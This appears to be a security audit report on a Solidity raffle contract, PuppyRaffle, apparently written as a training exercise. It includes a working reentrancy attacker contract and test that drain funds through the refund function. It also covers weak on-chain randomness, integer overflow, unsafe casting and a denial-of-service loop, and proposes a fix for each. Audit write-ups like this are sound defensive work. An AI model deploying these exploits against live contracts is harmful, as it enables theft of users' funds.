# High

### [H-1]  Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain contract balance.

**Description** The `PuppyRaffle::refund` function does not follow [CEI/FREI-PI] and as a result, enables participants to drain the contract balance. 

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address, and only after making that external call, we update the `players` array. 

```solidity
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(
            playerAddress == msg.sender,
            "PuppyRaffle: Only the player can refund"
        );
        require(
            playerAddress != address(0),
            "PuppyRaffle: Player already refunded, or is not active"
        );
@>       payable(msg.sender).sendValue(entranceFee);
@>       players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue to cycle this until the contract balance is drained. 

**Impact** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concepts**

1. Users enters the raffle.
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their contract, draining the contract balance.

**Proof of Code:**

<details>
<summary>Code</summary>

Add the following code to the `PuppyRaffleTest.t.sol` file.

```solidity
contract ReentracyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attakerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attakerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attakerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attakerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

function test_ReentrancyInRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentracyAttacker attackerContract = new ReentracyAttacker(puppyRaffle);
        address attackerAddress = makeAddr("attacker");
        vm.deal(attackerAddress, 1 ether);

        uint256 startingAttackerContractBalance = address(attackerContract)
            .balance;
        uint256 startingPuppyRaffleContractBalance = address(puppyRaffle)
            .balance;
        //attack
        vm.prank(attackerAddress);
        attackerContract.attack{value: entranceFee}();

        console.log(
            "starting attaker contract balance: ",
            startingAttackerContractBalance
        );
        console.log(
            "starting puppy raffle contract balance: ",
            startingPuppyRaffleContractBalance
        );

        console.log(
            "ending attaker contract balance: ",
            address(attackerContract).balance
        );
        console.log(
            "ending puppy raffle contract balance: ",
            address(puppyRaffle).balance
        );
    }
```
</details>

**Recommended mitigation**  To fix this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well. 

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        (bool success,) = msg.sender.call{value: entranceFee}("");
        require(success, "PuppyRaffle: Failed to refund player");
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner

**Description** Hashing `msg.sender`, `block.timestamp` and `block.difficulty` together a predictable final number. A predictalble number is not a good random number. Malicious users can manipulate the values or know them a head of time to choose the winner of the raffle themselves.

*Note:* This additionally means users could fornt-run this function and call `PuppyRaffle::refund` to get a refund if they see they are not the winner.

**Impact** Any user can choose the winner of the raffle, winning the money and selecting the `rarest` puppy, essentially making it such that all puppies have the same rarity, since you can choose the puppy. 

**Proof of Concepts**

There are a few attack vectors here. 

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here. `block.difficulty` was recently replaced with `prevrandao`.
2. Users can manipulate the `msg.sender` value to result in their index being the winner.


Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).

### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description** In Solidity versions prior to `0.8.0`, integers were subject to integer overflows. 

```javascript
uint64 myVar = type(uint64).max; 
// myVar will be 18446744073709551615
myVar = myVar + 1;
// myVar will be 0
```

**Impact** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concepts**


1. Added 100 players to the raffle.
2. `totalFees` will be:
```javascript
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 20000000000000000000;
// due to overflow, the following is now the case
totalFees = 1553255926290448384;
```
3. You will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees`:
```javascript
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do. 

<details>
<summary>Proof Of Code</summary>
Place this into the `PuppyRaffleTest.t.sol` file.

```solidity
            function test_totalFeesOverflow() public {
                address[] memory players = new address[](100);
                for (uint256 i = 0; i < 100; i++) {
                    players[i] = address(i);
                }
                puppyRaffle.enterRaffle{value: entranceFee * 100}(players);

                vm.warp(block.timestamp + duration + 1); // after the duration has passed
                vm.roll(block.number + 1);
                puppyRaffle.selectWinner();
                uint256 percentageFee = 20;
                uint256 calculated_fee = ((entranceFee * 100) * percentageFee) / 100;
                uint256 real_fee = puppyRaffle.totalFees();

                console.log("real_fee", real_fee);
                console.log("calculated_fee", calculated_fee);

                // withdraw fee after the winner is selected
                vm.expectRevert("PuppyRaffle: There are currently players active!");
                puppyRaffle.withdrawFees();
            }

            // uint128 fee = 1e18 * 20 // when type casting to uint64 it overflows
            // uint64(fee)
            // 1553255926290448384
```
</details>

**Recommended Mitigation:** There are a few recommended mitigations here.

1. Use a newer version of Solidity that does not allow integer overflows by default.

```diff 
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.18;
```

Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows. 

2. Use a `uint256` instead of a `uint64` for `totalFees`. 

```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;
```

3. Remove the balance check in `PuppyRaffle::withdrawFees` 

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
There are more ways this could cause issues.


# Medium

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

IMPACT: MEDIUM
LIKELIHOOD: MEDIUM

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::player` array is, the more checks a new players have to make. This means that gas costs for players who enter right when the raffle starts dramatically lower than those who enter later. Every  additional address in the `players` array, is an additional check the loop will have to make. There is a potential for front-running attack here.

```javascript
@>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas costs for raggle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, causing rush to be one of the first entrants

An attacker might make the `PuppyRaffle::enterRaffle` array so big, that no one else enters, guarenteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: ~6249936 
- 2nd 100 players: ~18068026

This is more than 3X expensive for the second 100 players.

<details><summary>PoC</summary>

- Place the following test into `PuppyRaffleTest.t.sol`

    ```solidity
    function test_denialOfService() public {
        // vm.txGasPrice(1);
        address[] memory players = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            players[i] = address(i);
        }
        uint256 entranceFeeForAll = entranceFee * 100;
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFeeForAll}(players);
        uint256 gasEnd = gasleft();
        console.log("Gas used for first 100: ", gasStart - gasEnd);
        
        //second 100 players
        address[] memory players2 = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            players2[i] = address(i + 100);
        }
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFeeForAll}(players2);
        uint256 gasEnd2 = gasleft();
        console.log("Gas used for second 100: ", gasStart2 - gasEnd2);
    }
    ```

</details>

**Recommended Mitigation:**

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so checking for duplicates doesn't prevent same person from entering multiple times.
2. Consider using mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.
3. alternatively you could use [Openzeppelin's `EumerableSet` library]

### [M-2] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting. 

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:** 
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended) - Pull over Push

### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated. 

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value. 

**Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:** 

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:

```javascript
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

```javascript
// We do some storage packing to save gas
```
But the potential gas saved isn't worth it if we have to recast and this bug exists. 

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

# Low

### [L-1] Potentially erroneous active player index

**Description:** The `PuppyRaffle::getActivePlayerIndex` function is intended to return zero when the given address is not active. However, it could also return zero for an active address stored in the first slot of the `players` array. This may cause confusions for users querying the function to obtain the index of an active player.

**Recommended Mitigation:** Return 2**256-1 (or any other sufficiently high number) to signal that the given player is inactive, so as to avoid collision with indices of active players.

# Gas

### [G-1] Unchanged state variables should be declared constant or immutable.

Reading from the storage is much more expensive than reading from a constant or immutable variable.

Instance:
- `PuppyRaffle::raffleDuration`  should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

###  [G-2] Storage variable in a loop should be cached

Everytime you call `players.length`, it will read from storage, as opposed to memory which is gas efficient.

```diff
+            uint256 playersLength = players.length;
-            for (uint256 i = 0; i < players.length - 1; i++) {
+            for (uint256 i = 0; i < playersLength - 1; i++) {    
-                for (uint256 j = i + 1; j < players.length; j++) {
+                for (uint256 j = i; j < playersLength - 1; j++) {
                    require(
                        players[i] != players[j],
                        "PuppyRaffle: Duplicate player"
                    );
                }
            }
```

# Informational

### [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

</details>

### [I-2]: Using an outdated version of Solidity is not recommended 

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**:
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.


### [I-3]: Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 72](src/PuppyRaffle.sol#L72)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 222](src/PuppyRaffle.sol#L222)

	```solidity
	        feeAddress = newFeeAddress;
	```

</details>


### [I-4]: `PupppyRaffle::selectWinner` does not follow CEI, which is not a best code practice.

It is recommended to follow the CEI pattern (Check-Effects-Interaction) to avoid reentrancy attacks (here: check are in place to avoid reentrancy like the raffle time updation) and to keep code clean.

```diff
-        (bool success, ) = winner.call{value: prizePool}("");
-        require(success, "PuppyRaffle: Failed to send prize pool to winner");
         _safeMint(winner, tokenId);
+        (bool success, ) = winner.call{value: prizePool}("");
+        require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-5] Magic Numbers 

**Description:** All number literals should be replaced with constants. This makes the code more readable and easier to maintain. Numbers without context are called "magic numbers".

**Recommended Mitigation:** Replace all magic numbers with constants. 

```diff
+       uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
+       uint256 public constant FEE_PERCENTAGE = 20;
+       uint256 public constant TOTAL_PERCENTAGE = 100;
.
.
.
-        uint256 prizePool = (totalAmountCollected * 80) / 100;
-        uint256 fee = (totalAmountCollected * 20) / 100;
         uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
         uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;
```

### [I-6] State changes are missing events

**Description:** Events are useful for tracking changes in the state of a contract. They can be used to track changes in the state of a contract, such as the player entering the raffle, the winner being selected, and the prize being distributed etc...

### [I-7] `PuppyRaffle::_isActivePlayer` ia never used and should be removed

**Description** The function `_isActivePlayer` is an internal function that is never used. It is not used in the contract and can be removed or can be made external for user to check if the player is active or not.